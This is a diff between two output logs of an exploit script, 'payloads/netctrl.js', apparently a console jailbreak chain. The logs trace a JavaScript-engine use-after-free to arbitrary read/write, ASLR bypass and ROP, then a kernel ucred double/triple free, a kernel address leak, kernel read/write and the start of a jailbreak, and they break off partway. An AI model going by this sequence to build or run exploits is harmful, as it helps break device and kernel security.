@@ -1,6 +1,7 @@
 run payloads/netctrl.js
-[*] Sent message (32823 bytes) to server !!
-> [*] Recieved message (32823 bytes) from client !!
+> run payloads/netctrl.js
+[*] Sent message (32887 bytes) to server !!
+> [*] Recieved message (32887 bytes) from client !!
 [*] registering timespec: sizeof: 16, alignof: 8
 [*] registering stat: sizeof: 120, alignof: 8
 [*] registering ModuleInfoForUnwind: sizeof: 304, alignof: 8
@@ -13,32 +14,32 @@ run payloads/netctrl.js
 [+] Looking for marker in uaf_u32...
 [+] Found marker at uaf_u32[20498] !!
 [*] boxed: 237,1
-[*] leak_addr: 0x000000022582BB40
-[*] container_addr: 0x00000002258B3D90
-[*] fake_addr: 0x00000002258B3DA0
+[*] leak_addr: 0x000000022602BB40
+[*] container_addr: 0x00000002260B3D90
+[*] fake_addr: 0x00000002260B3DA0
 [+] Achieved ARW !!
 [+] Initiate ASLR bypass...
-[*] addrof(Math.expm1): 0x000000022584E1A0
-[*] scope: 0x000000022581F800
-[*] native_executable: 0x0000000225844B20
-[*] native_executable_function: 0x00000000C3E29A00
-[*] native_executable_constructor: 0x00000000C3DA7E00
+[*] addrof(Math.expm1): 0x000000022604E1A0
+[*] scope: 0x000000022601F800
+[*] native_executable: 0x0000000226044B20
+[*] native_executable_function: 0x00000001DF9A1A00
+[*] native_executable_constructor: 0x00000001DF91FE00
 [+] Disabled GC
-[*] _error_addr: 0x000000082016AC70
-[*] strerror_addr: 0x000000010D868410
-[*] addrof(jsmaf.gc): 0x0000000225CA7BE0
-[*] native_invoke_addr: 0x0000000019720F20
+[*] _error_addr: 0x000000082777AC70
+[*] strerror_addr: 0x00000000F1CEC410
+[*] addrof(jsmaf.gc): 0x00000002261164E0
+[*] native_invoke_addr: 0x000000002D3C4F20
 [+] Achieved ASLR bypass !!
 [+] Initiate ROP...
-[*] fn_frame: 0x0000000225C9E750
+[*] fn_frame: 0x000000022689E750
 [+] Achieved ROP !!
 [+] Initiate SYSCALL...
 [+] Found 298 syscalls
 [+] Initiated SYSCALL !!
-[+] jsc base: 0x00000000C3D64000
-[+] libc base: 0x000000010D828000
-[+] libkernel base: 0x0000000820168000
-[+] eboot base: 0x00000000196E8000
+[+] jsc base: 0x00000001DF8DC000
+[+] libc base: 0x00000000F1CAC000
+[+] libkernel base: 0x0000000827778000
+[+] eboot base: 0x000000002D38C000
 [+] SDK version: 9.00
 [+] ===END===
 [*] registering cpuset: sizeof: 16, alignof: 8
@@ -63,10 +64,10 @@ run payloads/netctrl.js
 [*] iov_ss: 0x1B,0x1C
 [*] uio_ss: 0x1D,0x1E
 [*] Spawn iov threads..
-[*] iov_worker_ctx_addr: 0x00000002268AB210
+[*] iov_worker_ctx_addr: 0x00000002274AB210
 [*] iov threads spawned !!
 [*] Spawn uio threads..
-[*] iov_worker_ctx_addr: 0x0000000228046C08
+[*] iov_worker_ctx_addr: 0x0000000228570588
 [*] uio threads spawned !!
 [+] Environment setup completed !!
 [+] Ucred double free started...
@@ -76,147 +77,191 @@ run payloads/netctrl.js
 [*] Signaling work to iov threads...
 [*] iov threads work done !!
 [+] Looking for twins...
-[*] Found twins after 7 iterations !!
-[+] Found twins: 0x0000000000000023,0x0000000000000016 !!
+[+] [1/8] Error: Unable to find twins !!
+[+] Reattempt...
+[*] dummy_sock: 0x000000000000003F
+[*] uaf_sock: 0x000000000000003F
+[+] Attempt to set cr_refcnt back to 1 started...
+[*] Signaling work to iov threads...
+[*] iov threads work done !!
+[+] Looking for twins...
+[+] [2/8] Error: Unable to find twins !!
+[+] Reattempt...
+[*] dummy_sock: 0x000000000000003F
+[*] uaf_sock: 0x000000000000003F
+[+] Attempt to set cr_refcnt back to 1 started...
+[*] Signaling work to iov threads...
+[*] iov threads work done !!
+[+] Looking for twins...
+[+] [3/8] Error: Unable to find twins !!
+[+] Reattempt...
+[*] dummy_sock: 0x000000000000003F
+[*] uaf_sock: 0x000000000000003F
+[+] Attempt to set cr_refcnt back to 1 started...
+[*] Signaling work to iov threads...
+[*] iov threads work done !!
+[+] Looking for twins...
+[+] [4/8] Error: Unable to find twins !!
+[+] Reattempt...
+[*] dummy_sock: 0x000000000000003F
+[*] uaf_sock: 0x000000000000003F
+[+] Attempt to set cr_refcnt back to 1 started...
+[*] Signaling work to iov threads...
+[*] iov threads work done !!
+[+] Looking for twins...
+[*] Found twins after 0 iterations !!
+[+] Found twins: 0x0000000000000024,0x0000000000000030 !!
 [+] Ucred double free achieved !!
 [+] Ucred triple free started...
 [+] Attempt to set cr_refcnt back to 1 started...
 [*] Signaling work to iov threads...
-[*] Set cr_refcnt back to 1 after 27 iterations !!
+[*] Set cr_refcnt back to 1 after 16 iterations !!
 [*] iov threads work done !!
 [+] Set cr_refcnt back to 1 !!
 [+] Looking for triplets...
-[*] Found triplet after 2 iterations !!
-[*] Found triplet after 2 iterations !!
-[+] Found triplet: 0x0000000000000023,0x000000000000002B,0x000000000000003E !!
+[*] Found triplet after 1 iterations !!
+[*] Found triplet after 1 iterations !!
+[+] Found triplet: 0x0000000000000024,0x0000000000000037,0x0000000000000032 !!
 [+] Ucred triple free achieved !!
 [+] Leak kqueue started...
-[*] Leaked kqueue after 102 iterations !!
+[*] Leaked kqueue after 34 iterations !!
 [+] Leaked kqueue !!
-[*] kq_fdp: 0xFFFFF0CE3013EA00
-[*] kl_lock: 0xFFFFFFFFDB4E77F0
-[+] kernel base: 0xFFFFFFFFDB150000
-[*] Found triplet after 3 iterations !!
-[*] Found triplet: 0x0000000000000023,0x000000000000002B,0x000000000000002C !!
+[*] kq_fdp: 0xFFFFAEB130F42E00
+[*] kl_lock: 0xFFFFFFFF9647B7F0
+[+] kernel base: 0xFFFFFFFF960E4000
+[*] Found triplet after 0 iterations !!
+[*] Found triplet: 0x0000000000000024,0x0000000000000037,0x0000000000000020 !!
 [+] Leak kqueue completed !!
 [+] Initiate kernel ARW...
 [*] Signaling work to uio threads...
-[*] Reclaim with uio after 102 iterations !!
+[*] Reclaim with uio after 2 iterations !!
 [*] uio threads work done !!
 [*] Signaling work to iov threads...
-[*] Reclaim uio with iov after 13 iterations !!
+[*] Reclaim uio with iov after 18 iterations !!
 [*] iov threads work done !!
-[*] leak_bufs[0]: 0xFFFFF0CE07C5C800
-[*] Found triplet after 4 iterations !!
+[*] leak_bufs[0]: 0x4141414141414141
+[*] leak_bufs[1]: 0xFFFFAEB1304BA000
 [*] Found triplet after 0 iterations !!
-[*] Found triplet: 0x0000000000000023,0x0000000000000016,0x0000000000000034 !!
-[*] fdt_ofiles: 0xFFFFF0CE07C5C800
-[*] Signaling work to uio threads...
-[*] Reclaim with uio after 102 iterations !!
-[*] uio threads work done !!
-[*] Signaling work to iov threads...
-[*] Reclaim uio with iov after 33 iterations !!
-[*] iov threads work done !!
-[*] leak_bufs[0]: 0xFFFFF0CE07C512B0
-[*] Found triplet after 1 iterations !!
-[*] Found triplet after 3 iterations !!
-[*] Found triplet: 0x0000000000000023,0x0000000000000028,0x0000000000000035 !!
-[*] master_pipe_fp: 0xFFFFF0CE07C512B0
-[*] Signaling work to uio threads...
-[*] Reclaim with uio after 37 iterations !!
-[*] uio threads work done !!
-[*] Signaling work to iov threads...
-[*] Reclaim uio with iov after 25 iterations !!
-[*] iov threads work done !!
-[*] leak_bufs[0]: 0xFFFFF0CE07C502D8
+[*] leak_bufs[2]: 0x4141414141414141
 [*] Found triplet after 2 iterations !!
-[*] Found triplet after 2 iterations !!
-[*] Found triplet: 0x0000000000000023,0x000000000000002C,0x0000000000000039 !!
-[*] slave_pipe_fp: 0xFFFFF0CE07C502D8
+[*] Found triplet: 0x0000000000000024,0x0000000000000026,0x0000000000000020 !!
+[*] fdt_ofiles: 0xFFFFAEB1304BA000
 [*] Signaling work to uio threads...
-[*] Reclaim with uio after 102 iterations !!
+[*] Reclaim with uio after 6 iterations !!
 [*] uio threads work done !!
 [*] Signaling work to iov threads...
-[*] Reclaim uio with iov after 21 iterations !!
+[*] Reclaim uio with iov after 12 iterations !!
 [*] iov threads work done !!
-[*] leak_bufs[0]: 0xFFFFF0CE07CC3CB8
-[*] Found triplet after 3 iterations !!
-[*] Found triplet after 1 iterations !!
-[*] Found triplet: 0x0000000000000023,0x0000000000000024,0x000000000000002B !!
-[*] master_pipe_f_data: 0xFFFFF0CE07CC3CB8
-[*] Signaling work to uio threads...
-[*] Reclaim with uio after 65 iterations !!
-[*] uio threads work done !!
-[*] Signaling work to iov threads...
-[*] Reclaim uio with iov after 15 iterations !!
-[*] iov threads work done !!
-[*] leak_bufs[0]: 0xFFFFF0CE07CC3AA0
-[*] Found triplet after 4 iterations !!
+[*] leak_bufs[0]: 0xFFFFAEB10785F670
 [*] Found triplet after 0 iterations !!
-[*] Found triplet: 0x0000000000000023,0x0000000000000021,0x0000000000000031 !!
-[*] slave_pipe_f_data: 0xFFFFF0CE07CC3AA0
+[*] leak_bufs[1]: 0x4141414141414141
+[*] leak_bufs[2]: 0x4141414141414141
+[*] Found triplet after 0 iterations !!
+[*] Found triplet: 0x0000000000000024,0x0000000000000038,0x0000000000000036 !!
+[*] master_pipe_fp: 0xFFFFAEB10785F670
 [*] Signaling work to uio threads...
-[*] Reclaim with uio after 102 iterations !!
+[*] Reclaim with uio after 17 iterations !!
 [*] uio threads work done !!
 [*] Signaling work to iov threads...
-[*] Reclaim uio with iov after 31 iterations !!
+[*] Reclaim uio with iov after 10 iterations !!
 [*] iov threads work done !!
+[*] leak_bufs[0]: 0x4141414141414141
+[*] leak_bufs[1]: 0x4141414141414141
+[*] leak_bufs[2]: 0xFFFFAEB1260068A0
 [*] Found triplet after 1 iterations !!
-[*] Found triplet after 3 iterations !!
-[*] Found triplet: 0x0000000000000023,0x0000000000000032,0x000000000000003E !!
+[*] Found triplet after 1 iterations !!
+[*] Found triplet: 0x0000000000000024,0x0000000000000028,0x000000000000003A !!
+[*] slave_pipe_fp: 0xFFFFAEB1260068A0
+[*] Signaling work to uio threads...
+[*] Reclaim with uio after 2 iterations !!
+[*] uio threads work done !!
+[*] Signaling work to iov threads...
+[*] Reclaim uio with iov after 20 iterations !!
+[*] iov threads work done !!
+[*] leak_bufs[0]: 0x4141414141414141
+[*] leak_bufs[1]: 0x4141414141414141
+[*] leak_bufs[2]: 0xFFFFAEB107BE3CB8
+[*] Found triplet after 0 iterations !!
+[*] Found triplet after 0 iterations !!
+[*] Found triplet: 0x0000000000000024,0x0000000000000029,0x0000000000000031 !!
+[*] master_pipe_f_data: 0xFFFFAEB107BE3CB8
+[*] Signaling work to uio threads...
+[*] Reclaim with uio after 8 iterations !!
+[*] uio threads work done !!
+[*] Signaling work to iov threads...
+[*] Reclaim uio with iov after 12 iterations !!
+[*] iov threads work done !!
+[*] leak_bufs[0]: 0x4141414141414141
+[*] leak_bufs[1]: 0x4141414141414141
+[*] leak_bufs[2]: 0xFFFFAEB107BE3AA0
+[*] Found triplet after 1 iterations !!
+[*] Found triplet after 1 iterations !!
+[*] Found triplet: 0x0000000000000024,0x0000000000000020,0x000000000000002C !!
+[*] slave_pipe_f_data: 0xFFFFAEB107BE3AA0
+[*] Signaling work to uio threads...
+[*] Reclaim with uio after 18 iterations !!
+[*] uio threads work done !!
+[*] Signaling work to iov threads...
+[*] Reclaim uio with iov after 0 iterations !!
+[*] iov threads work done !!
+[*] Found triplet after 2 iterations !!
+[*] Found triplet after 0 iterations !!
+[*] Found triplet: 0x0000000000000024,0x0000000000000023,0x0000000000000039 !!
 [+] Achieved kernel ARW !!
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07C5C8B8 - value: 0xFFFFF0CE07C512B0
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07C512D8 - value: 0x0000000000000001
-[*] kwrite: 4 byte(s) - 0x0000000225BFCE28 => 0xFFFFF0CE07C512D8 - value: 0x0000000000000002
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07C5C8C0 - value: 0xFFFFF0CE078768A0
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE078768C8 - value: 0x0000000000000001
-[*] kwrite: 4 byte(s) - 0x0000000225BFCE28 => 0xFFFFF0CE078768C8 - value: 0x0000000000000002
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07C5C8C8 - value: 0xFFFFF0CE07C502D8
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07C50300 - value: 0x0000000000000002
-[*] kwrite: 4 byte(s) - 0x0000000225BFCE28 => 0xFFFFF0CE07C50300 - value: 0x0000000000000003
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07C5C8D0 - value: 0xFFFFF0CE07875450
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07875478 - value: 0x0000000000000001
-[*] kwrite: 4 byte(s) - 0x0000000225BFCE28 => 0xFFFFF0CE07875478 - value: 0x0000000000000002
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1304BA0B8 - value: 0xFFFFAEB10785F670
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB10785F698 - value: 0x0000000000000001
+[*] kwrite: 4 byte(s) - 0x00000002263FCE28 => 0xFFFFAEB10785F698 - value: 0x0000000000000002
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1304BA0C0 - value: 0xFFFFAEB1305B6630
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1305B6658 - value: 0x0000000000000001
+[*] kwrite: 4 byte(s) - 0x00000002263FCE28 => 0xFFFFAEB1305B6658 - value: 0x0000000000000002
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1304BA0C8 - value: 0xFFFFAEB1260068A0
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1260068C8 - value: 0x0000000000000002
+[*] kwrite: 4 byte(s) - 0x00000002263FCE28 => 0xFFFFAEB1260068C8 - value: 0x0000000000000003
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1304BA0D0 - value: 0xFFFFAEB126005EE0
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB126005F08 - value: 0x0000000000000001
+[*] kwrite: 4 byte(s) - 0x00000002263FCE28 => 0xFFFFAEB126005F08 - value: 0x0000000000000002
 [+] Corrupted context cleanup started...
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07C5C918 - value: 0xFFFFF0CE071B9E10
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE071B9E10 - value: 0xFFFFF0CE2CDE0000
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE2CDE0018 - value: 0xFFFFF0CE2CDA39D0
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE2CDA3AE8 - value: 0xFFFFF0CE2EFAB300
-[*] kwrite: 8 byte(s) - 0x0000000225BFCE28 => 0xFFFFF0CE2EFAB368 - value: 0x0000000000000000
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07C5C990 - value: 0xFFFFF0CE07FB7330
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07FB7330 - value: 0xFFFFF0CE100DB128
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE100DB140 - value: 0xFFFFF0CE2CDA2260
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE2CDA2378 - value: 0xFFFFF0CE071B0600
-[*] kwrite: 8 byte(s) - 0x0000000225BFCE28 => 0xFFFFF0CE071B0668 - value: 0x0000000000000000
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07C5C9F0 - value: 0xFFFFF0CE07FB6E50
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07FB6E50 - value: 0xFFFFF0CE2C79FA18
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE2C79FA30 - value: 0xFFFFF0CE2CDA0FA0
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE2CDA10B8 - value: 0xFFFFF0CE2CA97900
-[*] kwrite: 8 byte(s) - 0x0000000225BFCE28 => 0xFFFFF0CE2CA97968 - value: 0x0000000000000000
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07C5C9F8 - value: 0xFFFFF0CE07FB6BE0
-[*] uaf_fp: 0xFFFFF0CE07FB6BE0
-[*] kwrite: 8 byte(s) - 0x0000000225BFCE28 => 0xFFFFF0CE07C5C9F8 - value: 0x0000000000000000
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07C5CA00 - value: 0xFFFFF0CE07FB6768
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07C5CA00 - value: 0xFFFFF0CE07FB67D0
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07C5CA00 - value: 0xFFFFF0CE07FB6BE0
-[*] Socket 0x0000000000000040 uses uaf_fp, removing...
-[*] kwrite: 8 byte(s) - 0x0000000225BFCE28 => 0xFFFFF0CE07C5CA00 - value: 0x0000000000000000
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07C5CA08 - value: 0xFFFFF0CE07FB68A0
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07C5CA08 - value: 0xFFFFF0CE07FB6908
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07C5CA08 - value: 0xFFFFF0CE07FB6970
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07C5CA08 - value: 0xFFFFF0CE07FB69D8
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07C5CA08 - value: 0xFFFFF0CE07C510A8
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07C5CA08 - value: 0xFFFFF0CE07FB6AA8
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07C5CA08 - value: 0xFFFFF0CE07210410
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07C5CA08 - value: 0xFFFFF0CE07FB6B78
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07C5CA08 - value: 0xFFFFF0CE072A1B38
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07C5CA08 - value: 0xFFFFF0CE07FB6BE0
-[*] Socket 0x0000000000000041 uses uaf_fp, removing...
-[*] kwrite: 8 byte(s) - 0x0000000225BFCE28 => 0xFFFFF0CE07C5CA08 - value: 0x0000000000000000
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07C5CA10 - value: 0xFFFFF0CE07FB6BE0
-[*] Socket 0x0000000000000042 uses uaf_fp, removing...
-[*] kwrite: 8 byte(s) - 0x0000000225BFCE28 => 0xFFFFF0CE07C5CA10 - value: 0x0000000000000000
-[+] Cleanup uaf_fp after 13 iterations !!
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1304BA120 - value: 0xFFFFAEB10785E150
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB10785E150 - value: 0xFFFFAEB1260163C0
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1260163D8 - value: 0xFFFFAEB1306A7840
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1306A7958 - value: 0xFFFFAEB10B022B00
+[*] kwrite: 8 byte(s) - 0x00000002263FCE28 => 0xFFFFAEB10B022B68 - value: 0x0000000000000000
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1304BA118 - value: 0xFFFFAEB130096428
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB130096428 - value: 0xFFFFAEB126016838
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB126016850 - value: 0xFFFFAEB1306A79D0
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1306A7AE8 - value: 0xFFFFAEB131056D00
+[*] kwrite: 8 byte(s) - 0x00000002263FCE28 => 0xFFFFAEB131056D68 - value: 0x0000000000000000
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1304BA1C8 - value: 0xFFFFAEB130094D00
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB130094D00 - value: 0xFFFFAEB126026CB0
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB126026CC8 - value: 0xFFFFAEB1306A5770
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1306A5888 - value: 0xFFFFAEB12A0F4600
+[*] kwrite: 8 byte(s) - 0x00000002263FCE28 => 0xFFFFAEB12A0F4668 - value: 0x0000000000000000
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1304BA1F8 - value: 0xFFFFAEB126004EA0
+[*] uaf_fp: 0xFFFFAEB126004EA0
+[*] kwrite: 8 byte(s) - 0x00000002263FCE28 => 0xFFFFAEB1304BA1F8 - value: 0x0000000000000000
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1304BA200 - value: 0xFFFFAEB10724D860
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1304BA200 - value: 0xFFFFAEB1072821B8
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1304BA200 - value: 0xFFFFAEB130096288
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1304BA200 - value: 0xFFFFAEB10785EBE0
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1304BA200 - value: 0xFFFFAEB126004EA0
+[*] Socket 0x0000000000000040 uses uaf fp, removing...
+[*] kwrite: 8 byte(s) - 0x00000002263FCE28 => 0xFFFFAEB1304BA200 - value: 0x0000000000000000
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1304BA208 - value: 0xFFFFAEB1305B4AF8
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1304BA208 - value: 0xFFFFAEB126004EA0
+[*] Socket 0x0000000000000041 uses uaf fp, removing...
+[*] kwrite: 8 byte(s) - 0x00000002263FCE28 => 0xFFFFAEB1304BA208 - value: 0x0000000000000000
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1304BA210 - value: 0xFFFFAEB1305B4AF8
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1304BA210 - value: 0xFFFFAEB10785EBE0
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1304BA210 - value: 0xFFFFAEB130096288
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1304BA210 - value: 0xFFFFAEB1072821B8
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1304BA210 - value: 0xFFFFAEB10724D860
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1304BA210 - value: 0xFFFFAEB1072814B8
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1304BA210 - value: 0xFFFFAEB130096970
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1304BA210 - value: 0xFFFFAEB10724C410
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1304BA210 - value: 0xFFFFAEB126004EA0
+[*] Socket 0x0000000000000042 uses uaf fp, removing...
+[*] kwrite: 8 byte(s) - 0x00000002263FCE28 => 0xFFFFAEB1304BA210 - value: 0x0000000000000000
+[+] Cleanup uaf fp after 15 iterations !!
 [+] Corrupted context cleanup complated !!
 [+] Environment cleanup started...
 [*] Signaling stop to iov threads...
@@ -229,199 +274,202 @@ run payloads/netctrl.js
 [*] iov_thread_2 returned !!
 [*] exception: null
 [*] return: undefined
-[*] iov_thread_3 returned !!
-[*] exception: null
-[*] return: undefined
 [*] iov threads stopped !!
 [*] Signaling stop to uio threads...
 [*] uio_thread_0 returned !!
 [*] exception: null
 [*] return: undefined
+[*] uio_thread_1 returned !!
+[*] exception: null
+[*] return: undefined
+[*] uio_thread_2 returned !!
+[*] exception: null
+[*] return: undefined
 [*] uio threads stopped !!
 [+] Environment cleanup completed !!
 [+] Finding allproc...
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07C5C8D8 - value: 0xFFFFF0CE07FB71F8
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07FB71F8 - value: 0xFFFFF0CE07CC3888
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07CC3958 - value: 0xFFFFF0CE55968EC0
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE55968EC0 - value: 0xFFFFF0CE2CB0E238
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE2CB0E240 - value: 0xFFFFF0CE2CB0D6D0
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE2CB0D6D8 - value: 0xFFFFFFFFDCCE46E0
-[+] allproc: 0xFFFFFFFFDCCE46E0
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1304BA0D8 - value: 0xFFFFAEB10785D178
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB10785D178 - value: 0xFFFFAEB107BE3888
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB107BE3958 - value: 0xFFFFAEB130EDD880
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB130EDD880 - value: 0xFFFFAEB1062C8000
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1062C8008 - value: 0xFFFFAEB1062C6DA0
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1062C6DA8 - value: 0xFFFFFFFF97C786E0
+[+] allproc: 0xFFFFFFFF97C786E0
 [+] Initiate jailbreak...
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFFFFFDCCE46E0 - value: 0xFFFFF0CE2CB0D6D0
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE2CB0D780 - value: 0x0000000000000046
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE2CB0D6D0 - value: 0xFFFFF0CE2CB0E238
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE2CB0E2E8 - value: 0x0000000000000045
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFFFFFDCCE46E0 - value: 0xFFFFF0CE2CB0D6D0
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE2CB0D780 - value: 0x0000000000000046
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE2CB0D6D0 - value: 0xFFFFF0CE2CB0E238
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE2CB0E2E8 - value: 0x0000000000000045
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE2CB0E238 - value: 0xFFFFF0CE2CB0EDA0
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE2CB0EE50 - value: 0x0000000000000044
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE2CB0EDA0 - value: 0xFFFFF0CE062B56D0
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE062B5780 - value: 0x0000000000000043
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE062B56D0 - value: 0xFFFFF0CE2CB10000
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE2CB100B0 - value: 0x0000000000000042
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE2CB10000 - value: 0xFFFFF0CE2CB10B68
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE2CB10C18 - value: 0x0000000000000041
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE2CB10B68 - value: 0xFFFFF0CE062B8000
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE062B80B0 - value: 0x000000000000003E
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE062B8000 - value: 0xFFFFF0CE073D0000
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE073D00B0 - value: 0x000000000000003C
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE073D0000 - value: 0xFFFFF0CE2CB116D0
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE2CB11780 - value: 0x000000000000003B
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE2CB116D0 - value: 0xFFFFF0CE07266238
